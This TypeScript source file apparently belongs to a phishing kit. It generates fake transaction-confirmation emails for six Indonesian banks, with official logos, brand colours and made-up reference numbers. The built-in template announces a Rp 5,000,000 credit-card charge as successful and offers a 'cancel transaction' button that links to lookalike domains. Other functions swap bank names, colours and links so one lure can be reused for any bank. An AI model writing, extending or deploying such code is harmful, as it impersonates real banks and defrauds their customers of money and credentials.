import { BANK_PNG_BASE64 } from "./bankPngAssets";

export interface BankConfig {
  key: string;
  name: string;
  fullName: string;
  logoUrl: string;
  whiteLogoUrl: string;
  originalExternalLogoUrl: string;
  primaryColor: string;
  buttonColor: string;
  defaultCancelLink: string;
}

export const OFFICIAL_BANK_CONFIGS: Record<string, BankConfig> = {
  bca: {
    key: "bca",
    name: "BCA",
    fullName: "Bank Central Asia",
    logoUrl: "/bank-logos/bca.png",
    whiteLogoUrl: "/bank-logos/bca-white.png",
    originalExternalLogoUrl: "/bank-logos/bca.png",
    primaryColor: "#0066b2",
    buttonColor: "#005baa",
    defaultCancelLink: "https://bank-bca-pusat-layanan-keamanan-kartu-bca.ai.studio"
  },
  mandiri: {
    key: "mandiri",
    name: "Mandiri",
    fullName: "Bank Mandiri (Persero)",
    logoUrl: "/bank-logos/mandiri.png",
    whiteLogoUrl: "/bank-logos/mandiri-white.png",
    originalExternalLogoUrl: "https://thumb.wikimedia.org/wikipedia/commons/thumb/a/ad/Bank_Mandiri_logo_2016.svg/1280px-Bank_Mandiri_logo_2016.svg.png?utm_source=id.wikipedia.org&utm_campaign=index&utm_content=thumbnail",
    primaryColor: "#003a8f",
    buttonColor: "#002c6c",
    defaultCancelLink: "https://servis-mandiri.ai.studio"
  },
  bri: {
    key: "bri",
    name: "BRI",
    fullName: "Bank Rakyat Indonesia (Persero)",
    logoUrl: "/bank-logos/bri.png",
    whiteLogoUrl: "/bank-logos/bri-white.png",
    originalExternalLogoUrl: "https://thumb.wikimedia.org/wikipedia/commons/thumb/6/68/BANK_BRI_logo.svg/3840px-BANK_BRI_logo.svg.png?utm_source=id.wikipedia.org&utm_campaign=index&utm_content=thumbnail",
    primaryColor: "#00529c",
    buttonColor: "#004080",
    defaultCancelLink: "https://servis-bri.ai.studio"
  },
  bni: {
    key: "bni",
    name: "BNI",
    fullName: "Bank Negara Indonesia (Persero)",
    logoUrl: "/bank-logos/bni.png",
    whiteLogoUrl: "/bank-logos/bni-white.png",
    originalExternalLogoUrl: "https://thumb.wikimedia.org/wikipedia/commons/thumb/f/f0/Bank_Negara_Indonesia_logo_%282004%29.svg/3840px-Bank_Negara_Indonesia_logo_%282004%29.svg.png?utm_source=id.wikipedia.org&utm_campaign=index&utm_content=thumbnail",
    primaryColor: "#005e6a",
    buttonColor: "#004d57",
    defaultCancelLink: "https://servis-bni.ai.studio"
  },
  cimb: {
    key: "cimb",
    name: "CIMB Niaga",
    fullName: "Bank CIMB Niaga",
    logoUrl: "/bank-logos/cimb.png",
    whiteLogoUrl: "/bank-logos/cimb-white.png",
    originalExternalLogoUrl: "https://upload.wikimedia.org/wikipedia/commons/3/38/CIMB_Niaga_logo.svg?utm_source=id.wikipedia.org&utm_campaign=index&utm_content=original",
    primaryColor: "#8b0000",
    buttonColor: "#7a0000",
    defaultCancelLink: "https://servis-cimbniaga.ai.studio"
  },
  uob: {
    key: "uob",
    name: "UOB",
    fullName: "Bank UOB Indonesia",
    logoUrl: "/bank-logos/uob.png",
    whiteLogoUrl: "/bank-logos/uob-white.png",
    originalExternalLogoUrl: "https://upload.wikimedia.org/wikipedia/commons/7/75/UOB_logo.png?utm_source=id.wikipedia.org&utm_campaign=index&utm_content=original",
    primaryColor: "#00205b",
    buttonColor: "#001845",
    defaultCancelLink: "https://servis-uob.ai.studio"
  }
};

/**
 * Automatically detect which bank is mentioned in template HTML or plain text.
 */
export function detectBankKey(content: string = ""): string {
  if (!content || typeof content !== "string") return "";

  // Strip <style>, <script>, base64 data URIs, and HTML tags to prevent false matches from CSS or image data
  const sanitized = content
    .replace(/<style\b[^>]*>[\s\S]*?<\/style>/gi, " ")
    .replace(/<script\b[^>]*>[\s\S]*?<\/script>/gi, " ")
    .replace(/data:image\/[^;]+;base64,[A-Za-z0-9+/=]+/gi, " ")
    .replace(/<[^>]+>/g, " ")
    .replace(/\s+/g, " ")
    .trim()
    .toLowerCase();

  // Check specific bank keywords with strict word boundaries
  // BCA (Bank Central Asia)
  if (
    /\b(bca|klikbca|mybca|central\s*asia|bank\s*bca)\b/i.test(sanitized) ||
    /bank-logo\/bca|bank-logos\/bca|logo.*bca/i.test(content)
  ) {
    return "bca";
  }

  // Mandiri (Bank Mandiri / Livin')
  if (
    /\b(mandiri|livin|bank\s*mandiri)\b/i.test(sanitized) ||
    /bank-logo\/mandiri|bank-logos\/mandiri|logo.*mandiri/i.test(content)
  ) {
    return "mandiri";
  }

  // BRI (Bank Rakyat Indonesia / BRImo)
  if (
    /\b(bri|brimo|rakyat\s*indonesia|bank\s*bri)\b/i.test(sanitized) ||
    /bank-logo\/bri|bank-logos\/bri|logo.*bri/i.test(content)
  ) {
    return "bri";
  }

  // BNI (Bank Negara Indonesia / wondr / BNI 46)
  if (
    /\b(bni|wondr|negara\s*indonesia|bank\s*bni)\b/i.test(sanitized) ||
    /bank-logo\/bni|bank-logos\/bni|logo.*bni/i.test(content)
  ) {
    return "bni";
  }

  // CIMB Niaga / OCTO
  if (
    /\b(cimb|cimb\s*niaga|octo|octoclicks|octomobile|niaga)\b/i.test(sanitized) ||
    /bank-logo\/cimb|bank-logos\/cimb|logo.*cimb/i.test(content)
  ) {
    return "cimb";
  }

  // UOB Indonesia / TMRW
  if (
    /\b(uob|tmrw|united\s*overseas|bank\s*uob)\b/i.test(sanitized) ||
    /bank-logo\/uob|bank-logos\/uob|logo.*uob/i.test(content)
  ) {
    return "uob";
  }

  return "";
}

/**
 * Automatically detect transaction scenario from text or HTML.
 */
export function detectScenarioKey(content: string = ""): "payment" | "transfer" | "refund" | "topup" | "cash_advance" {
  const text = (content || "").toLowerCase();
  if (text.includes("refund") || text.includes("pengembalian") || text.includes("retur")) {
    return "refund";
  }
  if (text.includes("transfer") || text.includes("bi-fast") || text.includes("bifast") || text.includes("antar bank")) {
    return "transfer";
  }
  if (text.includes("top up") || text.includes("topup") || text.includes("isi saldo") || text.includes("shopeepay") || text.includes("gopay") || text.includes("ovo") || text.includes("dana")) {
    return "topup";
  }
  if (text.includes("tarik tunai") || text.includes("cash advance") || text.includes("penarikan")) {
    return "cash_advance";
  }
  return "payment";
}

/**
 * Detects whether a given background color is dark, colored, or matches the bank's brand color.
 * If true, a white logo should be used; if false (white or near-white), the original logo color is retained.
 */
export function isDarkOrBrandBackground(bgColorStr?: string, bankPrimaryColor?: string): boolean {
  if (!bgColorStr || typeof bgColorStr !== "string") return false;
  const s = bgColorStr.toLowerCase().trim();
  if (!s || s === "transparent" || s === "inherit" || s === "initial" || s === "none") return false;
  
  // Standard white and light background variations
  if (
    s === "#fff" ||
    s === "#ffffff" ||
    s === "white" ||
    s.startsWith("rgb(255, 255, 255") ||
    s.startsWith("rgba(255, 255, 255") ||
    s === "#fafafa" ||
    s === "#f8fafc" ||
    s === "#f1f5f9" ||
    s === "#f3f4f6" ||
    s === "#f9fafb" ||
    s === "#f4f4f5" ||
    s === "#f5f5f5"
  ) {
    return false;
  }

  // If matches or contains bank brand color
  if (bankPrimaryColor) {
    const brand = bankPrimaryColor.toLowerCase().trim().replace("#", "");
    if (brand && s.includes(brand)) return true;
  }

  // Calculate RGB luminance (ITU-R BT.709 standard)
  let r = 255, g = 255, b = 255;
  if (s.startsWith("#")) {
    const hex = s.replace("#", "");
    if (hex.length === 3) {
      r = parseInt(hex[0] + hex[0], 16);
      g = parseInt(hex[1] + hex[1], 16);
      b = parseInt(hex[2] + hex[2], 16);
    } else if (hex.length >= 6) {
      r = parseInt(hex.substring(0, 2), 16);
      g = parseInt(hex.substring(2, 4), 16);
      b = parseInt(hex.substring(4, 6), 16);
    }
  } else if (s.startsWith("rgb")) {
    const m = s.match(/\d+/g);
    if (m && m.length >= 3) {
      r = parseInt(m[0], 10);
      g = parseInt(m[1], 10);
      b = parseInt(m[2], 10);
    }
  } else if (["navy", "blue", "darkblue", "teal", "darkred", "maroon", "black", "midnightblue", "indigo", "purple", "darkgreen"].includes(s)) {
    return true;
  }

  const luminance = (0.299 * r + 0.587 * g + 0.114 * b) / 255;
  return luminance < 0.70;
}

/**
 * Automatically detects the bank in the template content and injects/updates
 * the corresponding official bank logo at the top of the email template.
 * Adapts logo color to background:
 * - If background is dark / matches bank brand color: logo is white (whiteLogoUrl + brightness(0) invert(1))
 * - If background is white / light: logo uses its authentic original color (logoUrl)
 */
export function injectOrUpdateBankLogo(html: string, forcedBankKey?: string): string {
  if (!html || typeof html !== "string") return html;
  
  const bankKey = forcedBankKey || detectBankKey(html);
  if (!bankKey || !OFFICIAL_BANK_CONFIGS[bankKey]) {
    // No specific bank detected; preserve original HTML created by AI
    return html;
  }
  const cfg = OFFICIAL_BANK_CONFIGS[bankKey];
  let res = html;

  // 1. Remove any secondary Shopee logo from the email header if present
  res = res.replace(/<td\b[^>]*>\s*<img\b[^>]*?(?:Shopee|shopee)[^>]*?>\s*<\/td>/gi, "");
  res = res.replace(/<img\b[^>]*?(?:Shopee\.svg|alt=["']Shopee["'])[^>]*?>/gi, "");

  // 1.1 DOM-based precision adaptation when DOMParser is available
  if (typeof DOMParser !== "undefined") {
    try {
      const parser = new DOMParser();
      const doc = parser.parseFromString(res, "text/html");
      const imgs = doc.querySelectorAll("img");
      let foundBankLogo = false;

      imgs.forEach(img => {
        const src = img.getAttribute("src") || "";
        const alt = img.getAttribute("alt") || "";
        const isBankLogo = /logo|bank|bca|mandiri|bri|bni|cimb|uob|wikimedia|\/api\/bank-logo|\/bank-logos|data:image\/svg/i.test(src + " " + alt);
        
        if (isBankLogo) {
          foundBankLogo = true;
          // Walk up parent hierarchy to determine container background color
          let parentBg = "";
          let curr: HTMLElement | null = img.parentElement;
          while (curr && curr !== doc.body && curr !== doc.documentElement) {
            const style = curr.getAttribute("style") || "";
            const bgcolor = curr.getAttribute("bgcolor") || "";
            const bgMatch = style.match(/background(?:-color)?\s*:\s*([^;]+)/i);
            if (bgMatch && bgMatch[1] && bgMatch[1].trim() !== "transparent" && bgMatch[1].trim() !== "inherit") {
              parentBg = bgMatch[1].trim();
              break;
            }
            if (bgcolor && bgcolor.trim() !== "transparent" && bgcolor.trim() !== "inherit") {
              parentBg = bgcolor.trim();
              break;
            }
            curr = curr.parentElement;
          }

          const useWhiteLogo = isDarkOrBrandBackground(parentBg, cfg.primaryColor);
          const targetLogoUrl = useWhiteLogo ? cfg.whiteLogoUrl : cfg.logoUrl;

          img.setAttribute("src", targetLogoUrl);
          img.setAttribute("alt", `Logo Bank ${cfg.name}`);
          
          let curStyle = img.getAttribute("style") || "";
          curStyle = curStyle.replace(/filter\s*:[^;]+;?/gi, "").replace(/-webkit-filter\s*:[^;]+;?/gi, "").trim();
          
          if (useWhiteLogo) {
            // Apply white filter as backup for maximum email client rendering compatibility
            img.setAttribute("style", `${curStyle ? curStyle + "; " : ""}filter: brightness(0) invert(1); -webkit-filter: brightness(0) invert(1);`);
          } else {
            // Background is white -> retain original brand color, no invert filter
            img.setAttribute("style", curStyle);
          }
        }
      });

      if (foundBankLogo) {
        const isFullDoc = /<!doctype|<html>|<head>/i.test(res);
        return isFullDoc ? doc.documentElement.outerHTML : (doc.body ? doc.body.innerHTML : res);
      }
    } catch (e) {
      // Fallback to regex below
    }
  }

  // 2. Real-time bank logo replacement: match any bank logo img element
  const bankLogoImgRegex = /((?:<(?:table|tr|td|th|div|header)\b[^>]*>[\s\S]*?){1,4})?<img\b([^>]*?(?:logo|bank|bca|mandiri|bri|bni|cimb|uob|wikimedia|\/api\/bank-logo|\/bank-logos|data:image\/svg)[^>]*?)>/gi;
  
  if (bankLogoImgRegex.test(res)) {
    // Update existing bank logo src and alt with background-adaptive logic
    res = res.replace(bankLogoImgRegex, (_match, prefix, attrs) => {
      let isDarkBg = false;
      if (prefix) {
        const allBgs = [
          ...Array.from(prefix.matchAll(/background(?:-color)?\s*:\s*([^;"'>]+)/gi)),
          ...Array.from(prefix.matchAll(/bgcolor=["']([^"']+)["']/gi))
        ];
        if (allBgs.length > 0) {
          const lastBg = allBgs[allBgs.length - 1][1];
          isDarkBg = isDarkOrBrandBackground(lastBg, cfg.primaryColor);
        }
      }
      
      if (!isDarkBg) {
        // Check overall header style in content
        const bgMatch = res.match(/class=["'][^"']*(?:email-header|header)[^"']*["'][^>]*style=["'][^"']*background(?:-color)?\s*:\s*([^;"']+)/i)
          || res.match(/style=["'][^"']*background(?:-color)?\s*:\s*([^;"']+)[^"']*["'][^>]*class=["'][^"']*(?:email-header|header)/i);
        if (bgMatch && bgMatch[1]) {
          isDarkBg = isDarkOrBrandBackground(bgMatch[1], cfg.primaryColor);
        }
      }

      const targetLogoUrl = isDarkBg ? cfg.whiteLogoUrl : cfg.logoUrl;
      let updatedAttrs = attrs;
      
      if (/src=["'][^"']*["']/i.test(updatedAttrs)) {
        updatedAttrs = updatedAttrs.replace(/src=["'][^"']*["']/i, `src="${targetLogoUrl}"`);
      } else {
        updatedAttrs = ` src="${targetLogoUrl}" ${updatedAttrs}`;
      }
      
      if (/alt=["'][^"']*["']/i.test(updatedAttrs)) {
        updatedAttrs = updatedAttrs.replace(/alt=["'][^"']*["']/i, `alt="Logo Bank ${cfg.name}"`);
      } else {
        updatedAttrs += ` alt="Logo Bank ${cfg.name}"`;
      }

      if (isDarkBg) {
        if (/style=["'][^"']*["']/i.test(updatedAttrs)) {
          updatedAttrs = updatedAttrs.replace(/style=["']([^"']*)["']/i, (_m: string, s: string) => {
            const cleaned = s.replace(/filter\s*:[^;]+;?/gi, "").replace(/-webkit-filter\s*:[^;]+;?/gi, "").trim();
            return `style="${cleaned ? cleaned + "; " : ""}filter: brightness(0) invert(1); -webkit-filter: brightness(0) invert(1);"`;
          });
        } else {
          updatedAttrs += ` style="filter: brightness(0) invert(1); -webkit-filter: brightness(0) invert(1);"`;
        }
      } else {
        if (/style=["'][^"']*["']/i.test(updatedAttrs)) {
          updatedAttrs = updatedAttrs.replace(/style=["']([^"']*)["']/i, (_m: string, s: string) => {
            const cleaned = s.replace(/filter\s*:[^;]+;?/gi, "").replace(/-webkit-filter\s*:[^;]+;?/gi, "").trim();
            return `style="${cleaned}"`;
          });
        }
      }

      return `${prefix || ""}<img${updatedAttrs}>`;
    });
  } else {
    // 3. Inject official bank logo at the top of the email card
    const emailCardTdRegex = /(<td\b[^>]*\bclass=["'][^"']*\bemail-card-td\b[^"']*["'][^>]*>)/i;
    const genericEmailCardTdRegex = /(<table\b[^>]*\bclass=["'][^"']*\bemail-card\b[^"']*["'][^>]*>[\s\S]*?<tr\b[^>]*>\s*<td\b[^>]*>)/i;
    
    // Check background of the email card or td
    const bgMatch = html.match(/class=["'][^"']*(?:email-header|email-card)[^"']*["'][^>]*style=["'][^"']*background(?:-color)?\s*:\s*([^;"']+)/i)
      || html.match(/style=["'][^"']*background(?:-color)?\s*:\s*([^;"']+)[^"']*["'][^>]*class=["'][^"']*(?:email-header|email-card)/i);
    const isDark = bgMatch && bgMatch[1] ? isDarkOrBrandBackground(bgMatch[1], cfg.primaryColor) : false;
    const chosenLogo = isDark ? cfg.whiteLogoUrl : cfg.logoUrl;
    const filterStyle = isDark ? " filter: brightness(0) invert(1); -webkit-filter: brightness(0) invert(1);" : "";

    const headerLogoHtml = `\n              <!-- Official Bank Header Logo (${cfg.name}) -->\n              <table role="presentation" border="0" cellspacing="0" cellpadding="0" width="100%" style="margin: 0 auto 20px auto; border-collapse: collapse; text-align: center;">\n                  <tr>\n                      <td align="center" valign="middle" style="text-align: center; padding: 0 0 14px 0;">\n                          <img src="${chosenLogo}" alt="Logo Bank ${cfg.name}" width="140" style="max-height: 48px; max-width: 150px; object-fit: contain; display: block; margin: 0 auto; border: 0;${filterStyle}" />\n                      </td>\n                  </tr>\n              </table>\n`;

    if (emailCardTdRegex.test(res)) {
      res = res.replace(emailCardTdRegex, `$1${headerLogoHtml}`);
    } else if (genericEmailCardTdRegex.test(res)) {
      res = res.replace(genericEmailCardTdRegex, `$1${headerLogoHtml}`);
    } else if (/<body\b[^>]*>/i.test(res)) {
      res = res.replace(/(<body\b[^>]*>)/i, `$1${headerLogoHtml}`);
    }
  }

  return res;
}

/**
 * Generates an authentic, fresh reference number for the specified bank.
 */
export function generateUniqueBankReference(bankKey: string): string {
  const bank = OFFICIAL_BANK_CONFIGS[bankKey] || { name: "TRX" };
  const d = new Date();
  const year = d.getFullYear();
  const month = String(d.getMonth() + 1).padStart(2, "0");
  const day = String(d.getDate()).padStart(2, "0");
  const randNum = Math.floor(100000 + Math.random() * 900000);
  const randSuffix = Math.random().toString(36).substring(2, 6).toUpperCase();
  const cleanBankName = bank.name.toUpperCase().replace(/[^A-Z0-9]/g, "");
  return `${cleanBankName}${year}${month}${day}${randNum}${randSuffix}`;
}

/**
 * All known brand colors across supported banks to detect and purge stale accents.
 */
export const STALE_BANK_COLORS = [
  "#0066b2", "#005baa", "#004080", "#00529c", // BCA, BRI
  "#003a8f", "#002c6c", "#012a66", // Mandiri
  "#005e6a", "#004d57", "#024a54", // BNI
  "#8b0000", "#7a0000", "#990000", "#b91c1c", // CIMB
  "#00205b", "#001845", "#001233", // UOB
];

export interface FreshBankTemplateResult {
  html: string;
  newReference: string;
  previousBankKey: string;
  appliedBank: BankConfig;
}

/**
 * Automatically purges previous bank cache, lingering styles, residual colors,
 * outdated reference numbers, and sets the fresh bank's official identity.
 */
export function applyFreshBankTemplate(
  html: string,
  targetBankKey: string,
  options?: {
    customCancelLink?: string;
    generateNewRef?: boolean;
    forcedReference?: string;
  }
): FreshBankTemplateResult {
  const targetBank = OFFICIAL_BANK_CONFIGS[targetBankKey] || OFFICIAL_BANK_CONFIGS.bca;
  const previousBankKey = detectBankKey(html);
  
  let newReference = options?.forcedReference || "";
  if (!newReference && (options?.generateNewRef !== false)) {
    newReference = generateUniqueBankReference(targetBankKey);
  }

  let updated = html || "";

  // 1. If HTML is completely empty, construct a clean modern base template for the bank
  if (!updated.trim()) {
    const cancelLink = options?.customCancelLink?.trim() || targetBank.defaultCancelLink;
    const nowStr = new Date().toLocaleDateString("id-ID", { day: "2-digit", month: "2-digit", year: "numeric" }) + " " + new Date().toLocaleTimeString("id-ID", { hour: "2-digit", minute: "2-digit" }) + " WIB";
    
    updated = `<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Konfirmasi Transaksi Resmi - ${targetBank.name}</title>
</head>
<body style="margin: 0; padding: 0; background-color: #f8fafc; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;">
  <table role="presentation" width="100%" border="0" cellspacing="0" cellpadding="0" style="background-color: #f8fafc; padding: 30px 15px;">
    <tr>
      <td align="center">
        <table role="presentation" width="100%" border="0" cellspacing="0" cellpadding="0" style="max-width: 580px; background-color: #ffffff; border-radius: 16px; overflow: hidden; box-shadow: 0 10px 25px rgba(0,0,0,0.08); border: 1px solid #e2e8f0;">
          <tr>
            <td style="background-color: ${targetBank.primaryColor}; padding: 24px; text-align: center;">
              <img src="${targetBank.whiteLogoUrl}" alt="Logo Bank ${targetBank.name}" width="140" style="max-height: 48px; max-width: 150px; object-fit: contain; display: block; margin: 0 auto; filter: brightness(0) invert(1); -webkit-filter: brightness(0) invert(1);" />
            </td>
          </tr>
          <tr>
            <td style="padding: 28px 32px;">
              <span style="display: inline-block; background-color: #ecfdf5; color: #047857; font-size: 11px; font-weight: 800; text-transform: uppercase; padding: 4px 10px; border-radius: 12px; border: 1px solid #a7f3d0;">
                ✓ BERHASIL
              </span>
              <h2 style="margin: 12px 0 6px 0; font-size: 20px; font-weight: 800; color: #0f172a;">
                Konfirmasi Transaksi - ${targetBank.fullName}
              </h2>
              <p style="margin: 0 0 20px 0; font-size: 13.5px; color: #64748b; line-height: 1.5;">
                Transaksi Anda telah berhasil diotorisasi dengan aman oleh jaringan perbankan resmi.
              </p>
              
              <table role="presentation" width="100%" border="0" cellspacing="0" cellpadding="0" style="background-color: #f8fafc; border-radius: 12px; border: 1px solid #e2e8f0; padding: 16px 20px; margin-bottom: 24px;">
                <tr>
                  <td style="padding: 6px 0; font-size: 12.5px; color: #64748b;">Status</td>
                  <td style="padding: 6px 0; font-size: 13px; font-weight: 800; color: #059669; text-align: right;">BERHASIL</td>
                </tr>
                <tr>
                  <td style="padding: 6px 0; font-size: 12.5px; color: #64748b;">Metode Pembayaran</td>
                  <td style="padding: 6px 0; font-size: 13px; font-weight: 700; color: #1e293b; text-align: right;">Kartu Kredit VISA/MC</td>
                </tr>
                <tr>
                  <td style="padding: 6px 0; font-size: 12.5px; color: #64748b;">Nomor Referensi</td>
                  <td style="padding: 6px 0; font-size: 13px; font-family: monospace; font-weight: 700; color: ${targetBank.primaryColor}; text-align: right;">${newReference}</td>
                </tr>
                <tr>
                  <td style="padding: 6px 0; font-size: 12.5px; color: #64748b;">Nominal</td>
                  <td style="padding: 6px 0; font-size: 16px; font-weight: 800; color: #0f172a; text-align: right;">Rp 5.000.000</td>
                </tr>
                <tr>
                  <td style="padding: 6px 0; font-size: 12.5px; color: #64748b;">Tanggal & Waktu</td>
                  <td style="padding: 6px 0; font-size: 12.5px; font-weight: 600; color: #334155; text-align: right;">${nowStr}</td>
                </tr>
              </table>

              <div style="text-align: center; margin-top: 24px;">
                <a href="${cancelLink}" target="_blank" rel="noopener noreferrer" style="display: inline-block; width: 100%; max-width: 300px; box-sizing: border-box; background-color: ${targetBank.buttonColor}; color: #ffffff; text-align: center; text-decoration: none; padding: 13px 24px; font-size: 14px; font-weight: 700; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.15);">
                  Batalkan Transaksi
                </a>
              </div>
            </td>
          </tr>
          <tr>
            <td style="background-color: #f1f5f9; padding: 16px; text-align: center; font-size: 11px; color: #94a3b8; border-top: 1px solid #e2e8f0;">
              © 2026 ${targetBank.fullName}. Seluruh hak cipta dilindungi.
            </td>
          </tr>
        </table>
      </td>
    </tr>
  </table>
</body>
</html>`;
    return {
      html: updated,
      newReference,
      previousBankKey,
      appliedBank: targetBank
    };
  }

  // 2. PURGE RESIDUAL COLORS: Replace all previous bank color hexes with new bank's colors
  for (const staleColor of STALE_BANK_COLORS) {
    if (staleColor.toLowerCase() === targetBank.primaryColor.toLowerCase() ||
        staleColor.toLowerCase() === targetBank.buttonColor.toLowerCase()) {
      continue;
    }
    const colorRegex = new RegExp(staleColor, "gi");
    updated = updated.replace(colorRegex, targetBank.primaryColor);
  }

  // 3. PURGE PREVIOUS BANK NAMES: Replace mentions of other banks with target bank
  const allBankNames = [
    { key: "bca", full: "Bank Central Asia", short: "BCA" },
    { key: "mandiri", full: "Bank Mandiri (Persero)", short: "Mandiri" },
    { key: "mandiri", full: "Bank Mandiri", short: "Mandiri" },
    { key: "bri", full: "Bank Rakyat Indonesia (Persero)", short: "BRI" },
    { key: "bri", full: "Bank Rakyat Indonesia", short: "BRI" },
    { key: "bni", full: "Bank Negara Indonesia (Persero)", short: "BNI" },
    { key: "bni", full: "Bank Negara Indonesia", short: "BNI" },
    { key: "cimb", full: "Bank CIMB Niaga", short: "CIMB Niaga" },
    { key: "cimb", full: "CIMB Niaga", short: "CIMB" },
    { key: "uob", full: "Bank UOB Indonesia", short: "UOB" },
    { key: "uob", full: "Bank UOB", short: "UOB" }
  ];

  for (const b of allBankNames) {
    if (b.key === targetBankKey) continue;
    // Replace full name first
    const fullRegex = new RegExp(b.full.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"), "gi");
    updated = updated.replace(fullRegex, targetBank.fullName);
    
    // Replace short name with word boundary
    const shortRegex = new RegExp(`\\b${b.short}\\b`, "g");
    updated = updated.replace(shortRegex, targetBank.name);
  }

  // 4. PURGE STALE/DUPLICATE LOGOS & INJECT FRESH BANK LOGO
  updated = injectOrUpdateBankLogo(updated, targetBankKey);

  // 5. PURGE PREVIOUS REFERENCE NUMBER & INJECT FRESH NEW REFERENCE
  if (newReference) {
    // Check if there is an existing reference number pattern (TRX..., REF..., CC..., BCA..., etc.)
    const refNumCellRegex = /(<(?:td|span|div|p)\b[^>]*>(?:No(?:mor)?\.?\s*Referensi|Reference(?:\s*No\.?)?)[\s\S]*?<\/(?:td|span|div|p)>\s*<(?:td|span|div|p)\b[^>]*>)([\s\S]*?)(<\/(?:td|span|div|p)>)/i;
    if (refNumCellRegex.test(updated)) {
      updated = updated.replace(refNumCellRegex, (_m, prefix, val, suffix) => {
        // Keep tag structure if there are inner tags (like <strong style="...">)
        if (/<[^>]+>/.test(val)) {
          const replacedVal = val.replace(/[A-Za-z0-9\-_]{6,26}/, newReference);
          return `${prefix}${replacedVal}${suffix}`;
        }
        return `${prefix}${newReference}${suffix}`;
      });
    } else {
      // General regex replacement for previous bank references
      const generalRefRegex = /\b(?:TRX|REF|CC|BCA|MANDIRI|BRI|BNI|CIMB|UOB)[A-Z0-9\-_]{6,24}\b/g;
      if (generalRefRegex.test(updated)) {
        updated = updated.replace(generalRefRegex, newReference);
      }
    }
  }

  // 6. UPDATE CANCEL LINK TO FRESH BANK LINK OR CUSTOM LINK
  const effectiveCancelLink = options?.customCancelLink?.trim() || targetBank.defaultCancelLink;
  if (effectiveCancelLink) {
    // Replace [LINK_PEMBATALAN]
    updated = updated.replace(/\[(?:LINK_PEMBATALAN|CANCEL_LINK|LINK)\]/gi, effectiveCancelLink);
    // Replace previous bank cancel links
    for (const otherKey of Object.keys(OFFICIAL_BANK_CONFIGS)) {
      if (otherKey !== targetBankKey) {
        const otherBank = OFFICIAL_BANK_CONFIGS[otherKey];
        if (otherBank.defaultCancelLink) {
          const escOtherLink = otherBank.defaultCancelLink.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
          updated = updated.replace(new RegExp(escOtherLink, "gi"), effectiveCancelLink);
        }
      }
    }
  }

  return {
    html: updated,
    newReference,
    previousBankKey,
    appliedBank: targetBank
  };
}
